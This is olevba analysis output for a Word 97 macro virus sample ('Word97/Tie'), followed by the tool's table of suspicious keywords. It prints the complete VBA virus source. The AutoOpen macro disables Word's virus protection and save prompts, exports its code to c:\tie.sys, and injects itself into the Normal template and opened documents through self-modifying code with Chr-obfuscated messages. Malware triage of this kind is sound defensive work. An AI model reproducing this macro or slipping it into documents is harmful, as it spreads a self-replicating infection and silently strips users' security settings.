olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bo-23a3bfe288a079ac08341dfefeeae0c13bdd3dc0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bo-23a3bfe288a079ac08341dfefeeae0c13bdd3dc0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub aUTOopEN()
'Word97/Tie by Virusdok1.doc
On Error GoTo 73
'Word97/Tie by Virusdok1.doc
Options.VirusProtection = False
'Word97/Tie by Virusdok1.doc
Options.SaveNormalPrompt = False
'Word97/Tie by Virusdok1.doc
Options.ConfirmConversions = False
'Word97/Tie by Virusdok1.doc
ties = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Word97/Tie by Virusdok1.doc
tier = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Word97/Tie by Virusdok1.doc
If tier > 76 And ties > 0 Then GoTo 73
'Word97/Tie by Virusdok1.doc
If tier < 76 Then
'Word97/Tie by Virusdok1.doc
 Set tvir = NormalTemplate.VBProject.VBComponents.Item(1)
'Word97/Tie by Virusdok1.doc
 ActiveDocument.VBProject.VBComponents.Item(1).Name = tvir.Name
'Word97/Tie by Virusdok1.doc
 ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\tie.sys"
'Word97/Tie by Virusdok1.doc
End If
'Word97/Tie by Virusdok1.doc
If ties = 0 Then Set tvir = ActiveDocument.VBProject.VBComponents.Item(1)
'Word97/Tie by Virusdok1.doc
 Infection = Int(Rnd * 100)
'Word97/Tie by Virusdok1.doc
 If Infection = 99 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(84) + Chr(105) + Chr(69) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'Word97/Tie by Virusdok1.doc
 If Day(Now) = 1 And (Month(Now) > 1) Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'Word97/Tie by Virusdok1.doc
 tvir.codemodule.AddFromFile ("c:\tie.sys")
'Word97/Tie by Virusdok1.doc
 With tvir.codemodule
'Word97/Tie by Virusdok1.doc
    For x = 1 To 4
'Word97/Tie by Virusdok1.doc
    .deletelines 1
'Word97/Tie by Virusdok1.doc
    Next x
'Word97/Tie by Virusdok1.doc
 End With
'Word97/Tie by Virusdok1.doc
 If tier < 76 Then
'Word97/Tie by Virusdok1.doc
    With tvir.codemodule
'Word97/Tie by Virusdok1.doc
    .replaceline 1, "Sub aUTOcLOSe()"
'Word97/Tie by Virusdok1.doc
    .replaceline 81, "Sub ToolsMacro()"
'Word97/Tie by Virusdok1.doc
    .replaceline 29, "If Day(Now) = 1 And (Month(Now) > 1) Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)"
'Word97/Tie by Virusdok1.doc
    .replaceline 31, "Infection = Int (Rnd *100)"
'Word97/Tie by Virusdok1.doc
    .replaceline 33, "If Infection = 99 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(84) + Chr(105) + Chr(69) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)"
'Word97/Tie by Virusdok1.doc
  End With
'Word97/Tie by Virusdok1.doc
 End If
'Word97/Tie by Virusdok1.doc
 With tvir.codemodule
'Word97/Tie by Virusdok1.doc
    For x = 2 To 78 Step 2
'Word97/Tie by Virusdok1.doc
    .replaceline x, "'Word97/Tie by Virus" & Application.ActiveWindow
'Word97/Tie by Virusdok1.doc
    Next x
'Word97/Tie by Virusdok1.doc
 End With
'Word97/Tie by Virusdok1.doc
73:
'Word97/Tie by Virusdok1.doc
 If tier > 76 And ties = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Word97/Tie by Virusdok1.doc
 End Sub

Sub ViewVBCode()

End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |aUTOopEN            |Runs when the Word document is opened        |
|AutoExec  |aUTOcLOSe           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

